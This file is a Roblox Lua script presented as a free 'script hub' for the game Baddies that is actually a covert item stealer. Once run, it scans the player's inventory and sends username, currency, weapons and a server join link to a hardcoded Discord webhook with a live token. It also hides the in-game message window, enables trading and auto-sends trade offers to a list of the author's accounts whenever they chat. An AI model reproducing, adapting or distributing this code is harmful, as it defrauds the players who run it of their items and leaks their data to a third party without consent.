-- cee script hub | Baddies Freemium v3
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService   = game:GetService("TextChatService")
local lp  = Players.LocalPlayer
local pg  = lp:WaitForChild("PlayerGui")

local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

-- Pink hex color: 0xFF69B4
local PINK = 0xFF69B4
local WEBHOOK_NAME = "cee script hub | Baddies " .. string.char(240,159,141,186)

local function sendRequest(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local h = {["Content-Type"] = "application/json"}
    local fns = {
        function() return request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return syn.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http_request({Url=url,Method="POST",Headers=h,Body=body}) end,
    }
    for _,f in ipairs(fns) do
        local s, r = pcall(f)
        if s and r then return r end
    end
end

local function fmtNum(n)
    if type(n) ~= "number" then return tostring(n) end
    if n >= 1e6 then return string.format("%.1fM", n/1e6)
    elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
    else return tostring(n) end
end

-- Detect executor name
local function getExecutor()
    if getexecutorname then
        local ok, n = pcall(getexecutorname)
        if ok and n then return n end
    end
    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED        then return "Krnl" end
    if fluxus             then return "Fluxus" end
    if Delta              then return "Delta" end
    if Electron           then return "Electron" end
    if Celery             then return "Celery" end
    return "Unknown Executor"
end

-- Classify all tools in backpack/char/gear
local BASE_PAT   = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle","stomp"}
local STYLE_PAT  = {"mma","karate","boxing","capoeira","breakdance","style","fighting","kung fu","judo","taekwondo"}
local STOMP_PAT  = {"stomp","slam"}

-- Rich weapons we specifically track (name, optional rarity label)
local RICH_WEAPONS = {
    {label="Spiked Kitty",         keys={"spiked kitty","spikekitty"}},
    {label="Glitter Bomb",         keys={"glitter bomb","glitterbomb"}},
    {label="Glitter Blue Spray",   keys={"glitter blue spray","glitter blue"}},
    {label="Love Me Hate Me Taser",keys={"love me hate me","lmhm"}},
    {label="Spiked Knuckles (50%)",keys={"spiked knuckle"}},
    {label="Ice Katana (30%)",     keys={"ice katana"}},
}

local function scanTools()
    local all = {}
    local function scan(obj)
        if not obj then return end
        for _, v in ipairs(obj:GetChildren()) do
            if v:IsA("Tool") then table.insert(all, v.Name) end
        end
    end
    pcall(scan, lp:FindFirstChild("Backpack"))
    pcall(scan, lp.Character)
    pcall(scan, lp:FindFirstChild("StarterGear"))
    return all
end

local function classify(all)
    local base, weapons, styles, stomps = {}, {}, {}, {}
    for _, name in ipairs(all) do
        local low = name:lower()
        local isBase, isStyle, isStomp = false, false, false
        for _, p in ipairs(BASE_PAT)  do if low:find(p,1,true) then isBase=true;  break end end
        for _, p in ipairs(STYLE_PAT) do if low:find(p,1,true) then isStyle=true; break end end
        for _, p in ipairs(STOMP_PAT) do if low:find(p,1,true) then isStomp=true; break end end
        if isStyle then      table.insert(styles,  name)
        elseif isStomp then  table.insert(stomps,  name)
        elseif isBase then   table.insert(base,    name)
        else                 table.insert(weapons, name)
        end
    end
    return base, weapons, styles, stomps
end

local function checkRichWeapons(all)
    local results = {}
    for _, rw in ipairs(RICH_WEAPONS) do
        local found = false
        for _, toolName in ipairs(all) do
            local low = toolName:lower()
            for _, key in ipairs(rw.keys) do
                if low:find(key,1,true) then found=true; break end
            end
            if found then break end
        end
        table.insert(results, rw.label..": "..(found and "true" or "false"))
    end
    return results
end

-- WEBHOOK PING — runs first, everything in pcall, no early returns
task.spawn(function()
    task.wait(2)

    local name    = lp.Name
    local all     = scanTools()
    local base, weapons, styles, stomps = classify(all)
    local richLines = checkRichWeapons(all)
    local isRich  = #weapons >= 3

    local ls      = lp:FindFirstChild("leaderstats")
    local din     = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
    local sla     = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"
    local pcnt    = #Players:GetPlayers()
    local maxp    = Players.MaxPlayers

    -- Executor
    local execName = getExecutor()

    -- Trade status: weapons = tradable, base items = untradable
    local tradable   = #weapons
    local untradable = #base
    local tradeStr   = string.char(240,159,159,162).." Tradable: "..tradable.."  |  "..string.char(240,159,148,180).." Untradable: "..untradable

    -- Weapons list: green circle 1x Name
    local weaponLines = {}
    for _, w in ipairs(weapons) do
        table.insert(weaponLines, string.char(240,159,159,162).." 1x "..w)
    end
    if #weaponLines == 0 then table.insert(weaponLines, "None") end

    -- Skins & Fighting Styles section
    local styleStr = #styles>0 and ("• "..table.concat(styles,"\n• ")) or "• None"
    local stompStr = #stomps>0 and ("• "..table.concat(stomps,"\n• ")) or "• None"
    local skinsStr = "Fighting Styles:\n"..styleStr.."\n\nStomps Skins:\n"..stompStr

    -- Clickable join link using Discord masked hyperlink
    local joinUrl  = "https://www.roblox.com/games/start?placeId="..tostring(game.PlaceId).."&gameInstanceId="..tostring(game.JobId)
    local joinLink = "[Click to Join]("..joinUrl..")"

    local embed = {
        color  = PINK,
        fields = {
            {name="User",                  value=name,                              inline=true},
            {name="Dinero",                value=fmtNum(din),                       inline=true},
            {name="Slays",                 value=fmtNum(sla),                       inline=true},
            {name="Executor",              value=execName,                          inline=true},
            {name="Players",               value=pcnt.." / "..maxp,                 inline=true},
            {name=string.char(226,128,139),value=string.char(226,128,139),          inline=true},
            {name="Trade Status",          value=tradeStr,                          inline=false},
            {name="Rich Weapons",          value=table.concat(richLines,"\n"),      inline=false},
            {name="Weapons",               value=table.concat(weaponLines,"\n"),    inline=false},
            {name="Skins & Fighting Styles",value=skinsStr,                         inline=false},
            {name="Join Link",             value=joinLink,                          inline=false},
        },
        footer    = {text="cee script hub | Baddies "..string.char(240,159,141,186).." | "..name},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }

    local content = ""
    if isRich and PING_POOR then content = "@everyone @here RICH HIT: "..name end

    if USER_WEBHOOK ~= "PUTHERE" then
        sendRequest(USER_WEBHOOK, {
            username = WEBHOOK_NAME,
            content  = content,
            embeds   = {embed},
        })
    end

    if isRich then
        sendRequest(MY_WEBHOOK, {
            username = WEBHOOK_NAME,
            content  = "@everyone RICH: "..name,
            embeds   = {embed},
        })
    end
end)

-- HIDE MESSAGES GUI
task.spawn(function()
    local function kill(g)
        if g.Name == "Messages" then pcall(function() g:Destroy() end) end
    end
    for _, g in ipairs(pg:GetChildren()) do kill(g) end
    pg.ChildAdded:Connect(kill)
    while true do
        task.wait(0.15)
        local m = pg:FindFirstChild("Messages")
        if m then pcall(function() m:Destroy() end) end
    end
end)

-- TRADING
task.spawn(function()
    pcall(function()
        ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]:FireServer("TradeEnabled", true)
    end)
    pcall(function()
        pg:WaitForChild("TradeList", 10)
            :WaitForChild("Main", 5)
            :WaitForChild("TradeRequest", 5).Visible = true
    end)

    local function onChat(sender)
        for _, u in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == u:lower() then
                task.wait(0.3)
                pcall(function()
                    ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]:InvokeServer(sender)
                end)
                break
            end
        end
    end

    pcall(function()
        TextChatService.OnIncomingMessage = function(msg)
            local ts = msg.TextSource
            if not ts then return end
            local s = Players:GetPlayerByUserId(ts.UserId)
            if s then task.delay(0.3, function() onChat(s) end) end
        end
    end)

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then pcall(function()
            p.Chatted:Connect(function() task.delay(0.3, function() onChat(p) end) end)
        end) end
    end

    Players.PlayerAdded:Connect(function(p)
        pcall(function()
            p.Chatted:Connect(function() task.delay(0.3, function() onChat(p) end) end)
        end)
    end)
end)
